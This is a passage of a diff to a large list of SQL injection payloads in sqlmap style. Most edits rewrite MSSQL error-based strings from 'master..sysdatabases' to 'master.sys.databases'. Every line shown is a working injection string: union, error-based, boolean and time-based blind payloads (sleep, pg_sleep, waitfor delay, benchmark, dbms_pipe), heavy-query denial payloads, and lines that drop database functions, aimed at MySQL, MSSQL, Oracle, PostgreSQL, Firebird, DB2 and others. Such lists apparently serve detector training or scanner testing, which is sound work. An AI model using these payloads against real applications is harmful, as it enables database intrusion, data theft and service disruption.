 1' ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( 'vedm' = 'vedm
 1' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) ) and 'hyun' like 'hyun
-select ( case when ( 4393 = 2875 ) then 1 else 4393* ( select 4393 from master..sysdatabases ) end ) --
+select ( case when ( 4393 = 2875 ) then 1 else 4393* ( select 4393 from master.sys.databases ) end ) --
 -1915%" ) ) union all select 7732,7732,7732,7732,7732,7732,7732,7732,7732#
 1' ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( 'qbdm' = 'qbdm
 1'+ ( select byor where 4538 = 4538
@@ -7245,7 +7191,7 @@ select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.sys
 1' procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and 'hofy' like 'hofy
 1 ) ) as emtf where 3561 = 3561 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --
 -5245" ) ) ) union all select 8106,8106,8106#
-select ( case when ( 8716 = 1338 ) then 1 else 8716* ( select 8716 from master..sysdatabases ) end ) --
+select ( case when ( 8716 = 1338 ) then 1 else 8716* ( select 8716 from master.sys.databases ) end ) --
 1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'hryb' = 'hryb
 1' ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'aumk' like 'aumk
 select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( ( "mofa" like "mofa
@@ -7263,7 +7209,7 @@ select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 
 1'|| ( select 'xyrk' from dual where 9844 = 9844 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
 1' where 5035 = 5035 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
 1' where 1652 = 1652 and sleep ( 5 ) #
-1', ( select ( case when ( 5154 = 5154 ) then 1 else 5154* ( select 5154 from master..sysdatabases ) end ) )
+1', ( select ( case when ( 5154 = 5154 ) then 1 else 5154* ( select 5154 from master.sys.databases ) end ) )
 1%" ) ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #
 1' ) ) as cwss where 9720 = 9720
 -6475" ) ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( "mdsx" like "mdsx
@@ -7305,7 +7251,7 @@ select sleep ( 5 ) and ( ( ( 8354 = 8354
 -5640" ) ) or 9792 = 2728--
 1' procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and 'ctac' like 'ctac
 -5764 or 3038 = 3038
-select ( case when ( 4996 = 1734 ) then 1 else 4996* ( select 4996 from master..sysdatabases ) end ) --
+select ( case when ( 4996 = 1734 ) then 1 else 4996* ( select 4996 from master.sys.databases ) end ) --
 select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( "snwx" like "snwx
 1 union all select null--
 select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( "%" = "
@@ -7316,7 +7262,7 @@ select * from generate_series ( 3551,3551,case when ( 3551 = 6451 ) then 1 else 
 call regexp_substring ( repeat ( right ( char ( 2385 ) ,0 ) ,500000000 ) ,null ) --
 -4313%' ) or 6872 = 6872 and ( '%' = '
 1' ) ) ) and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ( ( ( 'eihl' = 'eihl
-select ( case when ( 3140 = 4625 ) then 1 else 3140* ( select 3140 from master..sysdatabases ) end ) --
+select ( case when ( 3140 = 4625 ) then 1 else 3140* ( select 3140 from master.sys.databases ) end ) --
 -9861' union all select 5710,5710,5710,5710,5710--
 1 where 8273 = 8273 union all select null,null,null,null,null,null,null,null#
 1%' ) ) ) procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #
@@ -7386,7 +7332,7 @@ select ( case when ( 6002 = 9048 ) then 6002 else 6002* ( select 6002 from mysql
 -4955%' union all select 5928,5928--
 1' and elt ( 2266 = 7467,7467 )
 1' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and 'mepp' = 'mepp
-1, ( select ( case when ( 3717 = 3717 ) then 1 else 3717* ( select 3717 from master..sysdatabases ) end ) )
+1, ( select ( case when ( 3717 = 3717 ) then 1 else 3717* ( select 3717 from master.sys.databases ) end ) )
 1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'tmbs' = 'tmbs
 -4901 ) or 3407 = 6442#
 1' where 4134 = 4134 and 1102 = 6300--
@@ -7457,7 +7403,7 @@ waitfor delay '0:0:5' and ( ( ( 'ozjl' like 'ozjl
 1' and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
 1 ) ) ) order by 1#
 -5027%" ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( "%" = "
-select ( case when ( 4006 = 1276 ) then 1 else 4006* ( select 4006 from master..sysdatabases ) end ) --
+select ( case when ( 4006 = 1276 ) then 1 else 4006* ( select 4006 from master.sys.databases ) end ) --
 1'+ ( select 'tzey' where 4491 = 4491 union all select null,null,null,null,null,null,null,null--
 select count ( * ) from generate_series ( 1,5000000 ) # fnck
 1 order by 1#
@@ -7548,7 +7494,7 @@ select benchmark ( 5000000,md5 ( 0x714e4153 ) ) #
 1 ) as uuro where 6784 = 6784
 -7720 ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( 8254 = 8254
 1 ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 9325 = 9325
-1, ( select ( case when ( 5154 = 5154 ) then 1 else 5154* ( select 5154 from master..sysdatabases ) end ) )
+1, ( select ( case when ( 5154 = 5154 ) then 1 else 5154* ( select 5154 from master.sys.databases ) end ) )
 -6014" or make_set ( 3003 = 2609,2609 )
 1 ) where 6424 = 6424
 1%' or sleep ( 5 ) #
@@ -7601,7 +7547,7 @@ waitfor delay '0:0:5' and "cvqn" like "cvqn
 1' ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( 'tkcy' like 'tkcy
 -2210' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'myvr' like 'myvr
 1%" union all select null,null,null,null,null,null,null,null,null--
-select ( case when ( 1868 = 5071 ) then 1 else 1868* ( select 1868 from master..sysdatabases ) end ) --
+select ( case when ( 1868 = 5071 ) then 1 else 1868* ( select 1868 from master.sys.databases ) end ) --
 1' ) as hlbq where 2347 = 2347 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --
 1 ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --
 1'+ ( select acax where 4169 = 4169 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) +'
@@ -7645,7 +7591,7 @@ iif ( 4460 = 1610,1,1/0 )
 1'|| ( select 'vwmg' where 7928 = 7928
 1%' ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --
 1%" or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and "%" = "
-select ( case when ( 9343 = 9513 ) then 1 else 9343* ( select 9343 from master..sysdatabases ) end ) --
+select ( case when ( 9343 = 9513 ) then 1 else 9343* ( select 9343 from master.sys.databases ) end ) --
 1 ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( 4694 = 4694
 1" ) where 7471 = 7471 or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --
 if ( 4947 = 5350 ) select 4947 else drop function ereg--
@@ -8249,7 +8195,7 @@ select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rd
 -3499' ) ) ) or 2724 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 2724 = 2724 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'nzap' like 'nzap
 1' where 1673 = 1673 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --
 1" ) ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --
-select ( case when ( 7163 = 1777 ) then 1 else 7163* ( select 7163 from master..sysdatabases ) end ) --
+select ( case when ( 7163 = 1777 ) then 1 else 7163* ( select 7163 from master.sys.databases ) end ) --
 1%' ) union all select null,null,null,null,null,null,null,null,null,null#
 1' ) as wjty where 2971 = 2971
 1%" ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( "%" = "
@@ -8303,7 +8249,7 @@ end and '%' = '
 1 ) union all select null,null#
 -5957 ) ) ) union all select 8485,8485,8485,8485,8485,8485,8485,8485,8485--
 1' waitfor delay '0:0:5'
-select ( case when ( 9030 = 6952 ) then 1 else 9030* ( select 9030 from master..sysdatabases ) end ) --
+select ( case when ( 9030 = 6952 ) then 1 else 9030* ( select 9030 from master.sys.databases ) end ) --
 1' ) as vmmk where 5757 = 5757 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
 1'+ ( select 'ngdk' where 7264 = 7264 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'
 1'|| ( select 'mgel' where 3591 = 3591 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) ) ||'
@@ -8356,7 +8302,7 @@ waitfor delay '0:0:5' and 'gsvt' = 'gsvt
 -1447" union all select 3013,3013,3013,3013,3013,3013,3013--
 1%' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( '%' = '
 1 rlike ( select ( case when ( 8911 = 5301 ) then 1 else 0x28 end ) ) # pmuh
-select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( ( 'juhi' like 'juhi
+select count ( * ) from all_users as t1,all_users as t2,all_users as t3,all_users as t4,all_users as t5 and ( ( ( 'juhi' like 'juhi
 1" union all select null,null,null--
 1' in boolean mode )
 1' where 6035 = 6035 waitfor delay '0:0:5'--
@@ -8496,7 +8442,7 @@ select pg_sleep ( 5 ) and ( ( 'rnzp' = 'rnzp
 -1275" union all select 7861,7861,7861,7861,7861#
 1" ) ) ) and elt ( 2421 = 9612,9612 ) and ( ( ( "gbdx" like "gbdx
 1%' ) ) union all select null,null,null,null,null--
-select ( case when ( 9376 = 4521 ) then 1 else 9376* ( select 9376 from master..sysdatabases ) end ) --
+select ( case when ( 9376 = 4521 ) then 1 else 9376* ( select 9376 from master.sys.databases ) end ) --
 select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ( 'atyf' = 'atyf
 -6770' ) ) union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#
 1 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) # miji
@@ -8554,7 +8500,7 @@ iif ( 2840 = 3788,1,1/0 )
 1" ) ) as xwrq where 4161 = 4161
 -4681 or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) # rltx
 1%" ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #
-select ( case when ( 2968 = 2021 ) then 1 else 2968* ( select 2968 from master..sysdatabases ) end ) --
+select ( case when ( 2968 = 2021 ) then 1 else 2968* ( select 2968 from master.sys.databases ) end ) --
 1' ) ) as fusi where 2788 = 2788 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #
 1' and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and 'kudh' like 'kudh
 -9947" ) ) ) union all select 8765,8765,8765,8765,8765#
@@ -9115,7 +9061,7 @@ if ( 5316 = 4416 ) select 5316 else drop function vtve--
 1' where 4403 = 4403 rlike sleep ( 5 ) #
 -6587' ) union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--
 1%" ) ) ) and 6510 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( "%" = "
-1, ( select ( case when ( 3743 = 9640 ) then 1 else 3743* ( select 3743 from master..sysdatabases ) end ) )
+1, ( select ( case when ( 3743 = 9640 ) then 1 else 3743* ( select 3743 from master.sys.databases ) end ) )
 select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( ( "eqmy" = "eqmy
 1%' ) or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
 -9886%' ) ) ) union all select 5191,5191,5191,5191,5191,5191,5191--
@@ -9163,7 +9109,7 @@ select pg_sleep ( 5 ) and ( ( '%' = '
 1' ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( 'fdoc' like 'fdoc
 1' ) ) ) and 4069 = 8786 and ( ( ( 'eftr' = 'eftr
 1" ) ) as rhea where 2982 = 2982 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --
-select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master..sysdatabases ) end ) --
+select ( case when ( 5418 = 6516 ) then 1 else 5418* ( select 5418 from master.sys.databases ) end ) --
 -7037' ) ) as epsg where 3684 = 3684 union all select 3684--
 select pg_sleep ( 5 )
 1' ) where 7903 = 7903
@@ -9386,7 +9332,7 @@ if ( 8182 = 3225 ) select 8182 else drop function kpzk--
 -1031%" union all select 6832,6832,6832,6832#
 -9740" ) ) as pxkx where 5305 = 5305 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #
 1" ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( "ejpw" = "ejpw
-( select ( case when ( 6714 = 8872 ) then 1 else 6714* ( select 6714 from master..sysdatabases ) end ) )
+( select ( case when ( 6714 = 8872 ) then 1 else 6714* ( select 6714 from master.sys.databases ) end ) )
 -1084' ) union all select 2634,2634,2634,2634,2634,2634,2634,2634#
 select * from generate_series ( 1431,1431,case when ( 1431 = 7822 ) then 1 else 0 end ) limit 1--
 -5217 where 3620 = 3620 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --
@@ -9438,7 +9384,7 @@ select sleep ( 5 ) and ( ( "%" = "
 1' ) as yxdb where 4597 = 4597
 -1393' ) ) ) union all select 8280--
 1 where 9869 = 9869 union all select null,null#
-select ( case when ( 8294 = 4332 ) then 1 else 8294* ( select 8294 from master..sysdatabases ) end ) --
+select ( case when ( 8294 = 4332 ) then 1 else 8294* ( select 8294 from master.sys.databases ) end ) --
 1' ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )
 1' ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #
 -3775' ) as rqet where 7092 = 7092 or elt ( 1032 = 1032,3623 ) --
@@ -9494,7 +9440,7 @@ select * from generate_series ( 8147,8147,case when ( 8147 = 6336 ) then 1 else 
 1'|| ( select 'mzhj' where 9677 = 9677 union all select null,null,null--
 1' where 7910 = 7910
 end and ( ( ( 4675 = 4675
-select ( case when ( 9696 = 2874 ) then 1 else 9696* ( select 9696 from master..sysdatabases ) end ) --
+select ( case when ( 9696 = 2874 ) then 1 else 9696* ( select 9696 from master.sys.databases ) end ) --
 1' ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'tzrd' = 'tzrd
 1" ) as ymsc where 3694 = 3694 waitfor delay '0:0:5'--
 1'|| ( select 'npel' from dual where 5258 = 5258
@@ -10004,7 +9950,7 @@ select case when 1802 = 7063 then 1 else null end--
 1%' ) and 3580 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
 1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'ugrk' = 'ugrk
 call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and 'nhuk' = 'nhuk
-1, ( select ( case when ( 5885 = 1825 ) then 1 else 5885* ( select 5885 from master..sysdatabases ) end ) )
+1, ( select ( case when ( 5885 = 1825 ) then 1 else 5885* ( select 5885 from master.sys.databases ) end ) )
 1 ) as lhie where 4631 = 4631 union all select null,null,null,null,null--
 1" ) where 8588 = 8588
 1' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )
@@ -10578,7 +10524,7 @@ select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rd
 1 ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 6265 = 6265
 1" ) ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( ( "uncg" = "uncg
 1%' ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '
-( select ( case when ( 9337 = 9337 ) then waitfor delay '0:0:5' else 9337* ( select 9337 from master..sysdatabases ) end ) )
+( select ( case when ( 9337 = 9337 ) then waitfor delay '0:0:5' else 9337* ( select 9337 from master.sys.databases ) end ) )
 1' in boolean mode ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) #
 -8725" ) ) ) or ( 8459 = 8459 ) *4906 and ( ( ( "vblw" like "vblw
 1%' ) )
@@ -10781,7 +10727,7 @@ select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 
 1 where 2031 = 2031 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --
 -6020'+ ( select isrz where 2489 = 2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--
 1%' ) ) union all select null,null--
-( select ( case when ( 1421 = 1421 ) then 1 else 1421* ( select 1421 from master..sysdatabases ) end ) )
+( select ( case when ( 1421 = 1421 ) then 1 else 1421* ( select 1421 from master.sys.databases ) end ) )
 1' where 9206 = 9206
 1'+ ( select tafk where 9652 = 9652
 1',iif ( 4861 = 6268,1,1/0 )
@@ -10994,7 +10940,7 @@ select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rd
 1' ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( 'kqqf' = 'kqqf
 1' rlike ( select ( case when ( 7689 = 7689 ) then 1 else 0x28 end ) )
 1' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( 'narn' = 'narn
-1', ( select ( case when ( 3717 = 3717 ) then 1 else 3717* ( select 3717 from master..sysdatabases ) end ) )
+1', ( select ( case when ( 3717 = 3717 ) then 1 else 3717* ( select 3717 from master.sys.databases ) end ) )
 1 ) where 5234 = 5234 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #
 select * from generate_series ( 6468,6468,case when ( 6468 = 7999 ) then 1 else 0 end ) limit 1--
 1" where 1140 = 1140 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --
@@ -11125,7 +11071,7 @@ select * from generate_series ( 7724,7724,case when ( 7724 = 8170 ) then 1 else 
 1' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( 'qfwc' = 'qfwc
 1" ) ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( "wute" like "wute
 -8347%' ) union all select 7643,7643,7643--
-select ( case when ( 8993 = 4660 ) then 1 else 8993* ( select 8993 from master..sysdatabases ) end ) --
+select ( case when ( 8993 = 4660 ) then 1 else 8993* ( select 8993 from master.sys.databases ) end ) --
 -6017 union all select 8449,8449,8449--
 1" ) union all select null,null,null,null,null,null,null,null,null,null#
 1 ) ) as hxzh where 9284 = 9284
@@ -11166,7 +11112,7 @@ waitfor delay '0:0:5'
 1'|| ( select 'wtdz' from dual where 1866 = 1866 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --
 1%" and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and "%" = "
 1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'ozur' = 'ozur
-select ( case when ( 7254 = 5901 ) then 1 else 7254* ( select 7254 from master..sysdatabases ) end ) --
+select ( case when ( 7254 = 5901 ) then 1 else 7254* ( select 7254 from master.sys.databases ) end ) --
 -4550" ) as hlwe where 6026 = 6026 or ( 9364 = 9593 ) *9593--
 -9408%" ) ) union all select 1841,1841,1841,1841,1841,1841--
 1%" ) ) ) and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( "%" = "
@@ -11325,4 +11271,3 @@ select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 'fegp' = 'fegp
 1 ) ) as rwsn where 9946 = 9946 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) --
 1'+ ( select wjpc where 5943 = 5943 and make_set ( 8403 = 8403,8899 ) ) +'
 1%' ) ) ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) and ( ( '%' = '
-
